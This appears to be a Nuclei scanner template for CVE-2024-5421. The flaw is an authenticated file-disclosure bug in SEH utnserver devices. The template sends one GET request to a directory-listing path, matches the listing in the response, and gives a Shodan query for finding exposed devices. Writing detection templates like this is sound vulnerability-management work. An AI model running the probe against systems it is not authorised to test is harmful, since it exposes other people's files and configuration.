id: CVE-2024-5421

info:
  name: SEH utnserver Pro/ProMAX/INU-100 20.1.22 - File Exposure
  author: bl4ckp4r4d1s3
  severity: high
  description: |
    A vulnerability was identified in utnserver Pro, utnserver ProMAX, and INU-100 version 20.1.22 and earlier, impacting the file handling functions. This flaw results in authenticated file disclosure, granting unauthorized access to sensitive files and directories. Although authentication is required, the vulnerability poses a significant risk of data exposure. This vulnerability is publicly disclosed and identified as CVE-2024-5421.
  impact: |
    Authenticated attackers can access arbitrary files and directories on the system, potentially exposing sensitive configuration files, credentials, and system information.
  remediation: |
    Update SEH utnserver Pro/ProMAX/INU-100 to a version later than 20.1.22 that addresses the path traversal vulnerability.
  reference:
    - https://cyberdanube.com/en/en-multiple-vulnerabilities-in-seh-untserver-pro/index.html
    - https://seclists.org/fulldisclosure/2024/Jun/4
    - https://nvd.nist.gov/vuln/detail/CVE-2024-5421
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:L
    cvss-score: 8.7
    cve-id: CVE-2024-5421
    cwe-id: CWE-78
    epss-score: 0.23759
    epss-percentile: 0.95823
  metadata:
    verified: true
    max-request: 1
    shodan-query: "SEH HTTP Server"
  tags: cve,cve2024,utnserver,seh,exposure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/info/dir?/"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "/var/tmp</td>"
          - "File System Info"
          - 'face="courier'
        condition: and

      - type: status
        status:
          - 200
# digest: 490a0046304402206b153dab047ef63e0acd129cf2c06ec8856db54c84f332746242bf3d11b31732022056db8382ff936c7dc07ba5a48246f3c022aab1c2904fbac9cd1617ec41f94e9d:922c64590222798bb761d5b6d8e72950